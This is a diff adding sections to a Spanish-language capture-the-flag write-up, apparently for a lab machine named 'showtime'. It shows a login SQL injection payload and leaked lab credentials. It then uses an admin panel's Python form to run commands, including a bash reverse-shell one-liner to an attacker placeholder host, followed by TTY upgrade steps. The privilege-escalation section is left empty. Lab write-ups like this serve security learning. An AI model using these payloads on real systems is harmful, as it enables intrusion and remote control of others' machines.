@@ -116,6 +116,62 @@ Service detection performed. Please report any incorrect results at https://nmap
                     Parece que la web tiene temática de casino. En la esquina superior derecha vemos un botón que dice <i>login</i>, si lo presionamos nos dirige a un panel de login.
                 </p>
                 <img src="https://n4g1h4ck.github.io/images/DL/showtime/showtime2.png" alt="showtime web">
+                <p class="description">
+                    Intente un <i>SQL Injection</i> sencillo (<code class="language-sql">test' or 1=1-- -</code>) y funcionó!.
+                </p>
+                <img src="https://n4g1h4ck.github.io/images/DL/showtime/showtime3.png" alt="showtime web">
+                <p class="description">
+                    Al ver que el login es vulnerable a una inyección sql, tratare de probar una <i>inyección SQL ciega basada en tiempo</i>. Pueden utilizar <span class="highlight">SQLMap</span> para esta parte, sin embargo yo prefiero los metodos manuales así que hare unos <i>scripts en python</i> para que me automatice la explotación de la vulnerabilidad. En mis <a target="_blank" href="https://n4g1h4ck.github.io/tools.html" class="highlight">Herramientas</a> estarán los scripts explicados para los que quieran utilizarlos.
+                </p>
+                <h2 class="writeup_subtitle">Inyección SQL ciega basada en tiempo</h2>
+                <p class="description">
+                    Despues de ejecutar el script para determinar el nombre de la base de datos utilizada, me muestra que es <i>users</i>, gracias a este dato puedo utilizar el siguiente script para enumerar las tablas que emplea la base de datos.
+                    <br><br>
+                    Al finalizar la <i>fuerza bruta</i>, muestra que solo contiene una tabla llamada <i>usuarios</i>, ahora puedo pasar al siguiente script para enumerar las columnas.
+                    <br><br>
+                    Gracias al script nos damos cuenta que las columnas que contiene la tabla <i>usuarios</i> son <i>id,username y password</i>. Sabiendo todo lo anterior, ahora se viene lo bueno, con el ultimo script vamos a enumerar los valores que contienen las columnas de la base de datos.
+                    <br><br>
+                    EL ultimo script muestra las siguientes credenciales:
+                    <br><br>
+                    <i class="highlight">1:lucas:1233211233212:santiago:1234561234563:joe:miclaveesinhackeable</i>
+                    <br><br>
+                    Donde primero esta el <i class="highlight">nombre de usuario</i> (sin contar el id), luego estan ':' y la <i class="highlight">contraseña</i> del usuario.
+                </p>
+                <p class="description">
+                    Si probamos las credenciales en el login, vemos que al usuario <i class="highlight">joe</i> lo redirige a <i class="highlight">http://172.17.0.2/login_page/admin-panel.php</i>.
+                </p>
+                <img src="https://n4g1h4ck.github.io/images/DL/showtime/showtime4.png" alt="showtime web">
+                <p class="description">
+                    Vemos que hay un formulario que interpreta codigo python, si escribimos <code class="language-python">print('hola')</code> vemos que nos muestra el output. Lo siguiente que vamos a hacer es verificar si podemos ejecutar comandos con el modulo <i class="highlight">os</i> con este codigo:
+                </p>
+                <pre class="code"><code class="language-python">import os
+os.system('whoami')</code></pre>
+                <br><br>
+                <img src="https://n4g1h4ck.github.io/images/DL/showtime/showtime4.png" alt="showtime web">
+                <p class="description">Vemos que tenemos capacidad de ejecutar comandos, asi que vamos a utilizar un <i>oneliner en bash</i> para obtener una conexion por tcp hacia mi maquina atacante</p>
+                <pre class="code"><code class="language-python">import os
+os.system('bash -c "bash -i >& /dev/tcp/IP_DE_LA_máquina_ATACANTE/PUERTO_LOCAL 0>&1"')</code></pre>
+                <p class="description">
+                    Si estamos en una terminal con <i class="highlight">netcat</i> en escucha por el puerto especificado y ejecutamos el codigo python, obtendremos una reverse shell a nuestro equipo.
+                </p>
+                <h3 class="writeup_subtitle">Tratamiento de la tty</h3>
+                <p class="description">Empezamos dándonos una <i>pseudoconsola</i></p>
+                <pre class="code"><code class="language-ruby">script /dev/null -c bash</code></pre>
+                <p class="description">Ahora presionamos en el teclado <i>Ctrl+z</i></p>
+                <p class="description">Luego de esto escribimos lo siguiente</p>
+                <pre class="code"><code class="language-ruby">stty raw -echo;fg</code></pre>
+                <p class="description">Después escribimos</p>
+                <pre class="code"><code class="language-ruby">reset xterm</code></pre>
+                <p class="description">Ahora podemos ejecutar Ctrl+c sin que afecte a la terminal, para ejecutar <i>Ctrl+l</i> y se nos limpie la pantalla debemos ejecutar <span class="highlight">export TERM=xterm</span> y ahora debería funcionar</p>
+                <p class="description">
+                    si ejecutamos <i class="highlight">nano</i> vemos que las proporciones no son las adecuadas, para cambiarlo nos iremos a una terminal a parte y ejecutaremos <code class="language-ruby">stty size</code> y respondera con dos valores, por ejemplo: 36 140.
+                    <br><br>
+                    Entonces, en la terminal donde estabamos antes ejecutaremos <code class="language-ruby">stty rows 36 columns 140</code> para cambiar las dimensiones, ahora si ejecutamos <i class="highlight">nano</i> este debería tener las proporciones verdaderas.
+                </p>
+                <h3 class="writeup_subtitle">Escalada de Privilegios</h3>
+                <p class="description">
+                   
+                </p>
             </article>
         </main>
     </div>
@@ -125,5 +181,3 @@ Service detection performed. Please report any incorrect results at https://nmap
     <script src="https://n4g1h4ck.github.io/js/prism.js"></script>
 </body>
 </html>
-
-<!-- 15 de diciembre del 2024 -->
